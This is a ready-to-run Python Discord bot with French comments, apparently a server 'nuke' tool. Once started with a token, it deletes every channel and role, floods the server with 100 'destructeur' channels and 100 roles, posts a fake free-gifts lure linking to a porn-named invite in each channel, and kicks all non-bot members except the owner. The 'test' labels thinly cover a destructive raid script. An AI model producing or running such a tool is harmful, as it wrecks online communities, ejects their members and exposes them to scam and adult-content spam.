import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

AUTHORIZED_GUILD_ID = #votre server discord ici
OWNER_ID = # remplace par TON ID Discord perso

@bot.event
async def on_ready():
    print(f"[✅] Connecté en tant que {bot.user.name}")
    for guild in bot.guilds:
        if guild.id == AUTHORIZED_GUILD_ID:
            print(f"[🔧] Traitement du serveur : {guild.name} ({guild.id})")
            await nettoyer_serveur(guild)
            await creer_elements_test(guild)
            await kick_membres(guild)
        else:
            print(f"[⛔] Ignoré : {guild.name} ({guild.id})")

async def nettoyer_serveur(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"[Erreur] Suppression salon {channel.name} : {e}")

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"[Erreur] Suppression rôle {role.name} : {e}")

async def creer_elements_test(guild):
    for i in range(1, 101):
        try:
            salon = await guild.create_text_channel(f"destructeur-{i}")
            await salon.send("Viens sur ce site cadeaux offert par la communoter https://discord.gg/pornhub")
        except Exception as e:
            print(f"[Erreur] Création salon test-{i} : {e}")

    for i in range(1, 101):
        try:
            await guild.create_role(name=f"Destructeur-{i}")
        except Exception as e:
            print(f"[Erreur] Création rôle Destructeur-{i} : {e}")

async def kick_membres(guild):
    for member in guild.members:
        if member.bot or member.id == OWNER_ID:
            continue
        try:
            await member.kick(reason="Kick automatique du bot")
            print(f"[👢] Membre kické : {member.name}")
        except Exception as e:
            print(f"[Erreur] Kick {member.name} : {e}")

# Remplace par ton token
bot.run("TOKEN ICI")
